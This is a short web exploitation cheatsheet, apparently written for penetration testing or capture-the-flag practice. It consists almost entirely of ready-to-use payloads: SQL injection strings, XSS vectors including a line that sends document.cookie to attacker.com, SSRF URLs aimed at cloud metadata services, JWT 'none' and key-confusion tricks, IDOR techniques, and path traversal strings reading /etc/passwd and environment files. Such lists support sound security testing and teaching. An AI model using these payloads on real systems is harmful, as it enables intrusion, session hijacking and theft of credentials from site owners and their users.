# 🌐 Web Exploitation Cheatsheet

## SQL Injection
```sql
-- Boolean-based
' OR 1=1--
' AND 1=2--

-- UNION-based (column count олох)
' ORDER BY 1--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Error-based (MySQL)
' AND extractvalue(1,concat(0x7e,version()))--

-- Blind time-based
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL

-- Stacked queries
'; INSERT INTO users VALUES('hacker','hacked')--
```

## XSS
```javascript
// Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Filter bypass
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
javascript:alert(1)

// Cookie steal
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

// CSP bypass — dangling markup
<img src='https://attacker.com/?
```

## IDOR
```
- Change numeric IDs: /api/user/123 → /api/user/124
- Change GUIDs: predictable UUID v1 (time-based)
- Parameter pollution: ?userId=mine&userId=victim
- HTTP Method switch: GET → POST → PUT
- Encoding bypass: /api/user/MTI0  (base64 of 124)
```

## SSRF
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/     # AWS
http://metadata.google.internal/              # GCP
http://169.254.169.254/metadata/v1/           # DigitalOcean

# Filter bypass
http://0x7f000001/                  # Hex IP
http://2130706433/                  # Decimal IP
http://127.1/                       # Short form
http://[::1]/                       # IPv6
```

## JWT Attacks
```python
# 1. None algorithm
header = base64({"alg":"none","typ":"JWT"})
payload = base64({"user":"admin"})
token = header + "." + payload + "."

# 2. RS256 → HS256 confusion
# Sign with public key as HMAC secret

# 3. jku/x5u injection
# Point to attacker-controlled JWK endpoint
```

## LFI / Path Traversal
```
../../etc/passwd
....//....//etc/passwd          # Filter bypass
%2e%2e%2fetc%2fpasswd           # URL encode
/proc/self/environ
/var/log/apache2/access.log     # Log poisoning
php://filter/convert.base64-encode/resource=index.php
```
